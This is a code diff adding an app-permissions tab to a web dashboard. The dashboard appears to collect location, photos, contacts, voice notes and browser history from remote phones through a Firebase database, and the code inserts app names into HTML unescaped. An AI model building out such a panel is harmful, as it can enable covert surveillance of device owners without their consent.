@@ -189,6 +189,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <button class="tab-btn" data-tab="insights">&#x1F4CA; Insights</button>
 <button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
 <button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
+<button class="tab-btn" data-tab="permissions">&#x1F512; Perms</button>
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
@@ -310,6 +311,15 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 </div>
 <input type="text" id="browserSearch" placeholder="&#x1F50D; Search titles, URLs..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
 <div id="browserList"><div class="label">No browsing history yet</div></div>
+</div>
+<div id="tab-permissions">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+  <span style="font-size:14px;font-weight:500">&#x1F512; App Permissions</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollPermissions()">&#x1F504; Refresh</span>
+</div>
+<input type="text" id="permSearch" placeholder="&#x1F50D; Search app or permission..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
+<div style="font-size:10px;color:var(--muted);margin-bottom:6px" id="permSyncInfo"></div>
+<div id="permList"><div class="label">No permissions data yet</div></div>
 </div>
 <div id="tab-playback">
 <div class="pb-stats" id="pbStats" style="display:none">
@@ -710,6 +720,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'insights') renderInsights();
     if (btn.dataset.tab === 'storage') refreshStorage();
     if (btn.dataset.tab === 'browser') pollBrowserHistory();
+    if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
   });
 });
 
@@ -760,7 +771,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory()];
+  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -2254,6 +2265,76 @@ async function exportData() {
   a.click(); URL.revokeObjectURL(url);
   showAlert('Exported ' + (csv.match(/\n/g)||[]).length + ' rows', 'warn');
 }
+
+// --- App Permissions ---
+function renderPermissions() {
+  const list = document.getElementById('permList');
+  const syncInfo = document.getElementById('permSyncInfo');
+  if (!window.permCache || !window.permCache.length) {
+    list.innerHTML = '<div class="label">No permissions data yet</div>';
+    if (syncInfo) syncInfo.textContent = '';
+    return;
+  }
+  const query = (document.getElementById('permSearch')?.value || '').toLowerCase();
+  if (syncInfo) {
+    syncInfo.textContent = '\u{1F512} ' + window.permCache.length + ' apps \u2022 Last sync: ' + (window.permLastSync ? pktShort(window.permLastSync) : '--');
+  }
+  let html = '';
+  for (const app of window.permCache) {
+    const matched = !query || app.appName.toLowerCase().includes(query) || app.packageName.toLowerCase().includes(query) ||
+      app.permissions.some(p => p.name.toLowerCase().includes(query));
+    if (!matched) continue;
+    const granted = app.permissions.filter(p => p.granted).length;
+    const denied = app.permissions.filter(p => !p.granted).length;
+    html += '<div class="card" style="border-left-color:' + (denied > 0 ? 'var(--danger)' : 'var(--success)') + ';padding:8px 12px;margin-bottom:4px">' +
+      '<div style="display:flex;justify-content:space-between;align-items:center;font-size:12px;font-weight:500">' +
+      '<span>' + app.appName + '</span>' +
+      '<span style="font-size:10px;color:var(--muted)">' +
+      '<span style="color:var(--success)">\u2713 ' + granted + '</span>' +
+      (denied > 0 ? ' <span style="color:var(--danger)">\u2717 ' + denied + '</span>' : '') +
+      '</span></div>' +
+      '<div style="font-size:10px;color:var(--muted);margin-top:2px">' + app.packageName + '</div>';
+    if (denied > 0) {
+      html += '<div style="margin-top:4px;display:flex;flex-wrap:wrap;gap:3px">';
+      for (const p of app.permissions) {
+        if (!p.granted) {
+          const shortName = p.name.split('.').pop();
+          html += '<span style="font-size:9px;padding:1px 5px;border-radius:4px;background:rgba(248,81,73,0.15);color:var(--danger)">' + shortName + '</span>';
+        }
+      }
+      html += '</div>';
+    }
+    html += '</div>';
+  }
+  list.innerHTML = html || '<div class="label">No apps match your search</div>';
+}
+
+async function pollPermissions() {
+  if (!selectedDevice) return;
+  const data = await fetchRTDB(`devices/${selectedDevice}/permissions`);
+  if (!data || typeof data !== 'object') {
+    window.permCache = null;
+    window.permLastSync = 0;
+    document.getElementById('permList').innerHTML = '<div class="label">No permissions data yet</div>';
+    return;
+  }
+  window.permCache = Object.values(data).map(v => ({
+    appName: v.appName || v.packageName || '?',
+    packageName: v.packageName || '',
+    permissions: (v.permissions || []).map(p => ({
+      name: p.name || '',
+      granted: p.granted === true
+    }))
+  })).sort((a, b) => {
+    const aDenied = a.permissions.filter(p => !p.granted).length;
+    const bDenied = b.permissions.filter(p => !p.granted).length;
+    return bDenied - aDenied || a.appName.localeCompare(b.appName);
+  });
+  window.permLastSync = Date.now();
+  renderPermissions();
+}
+
+document.getElementById('permSearch')?.addEventListener('input', renderPermissions);
 
 // --- Init ---
 async function init() {
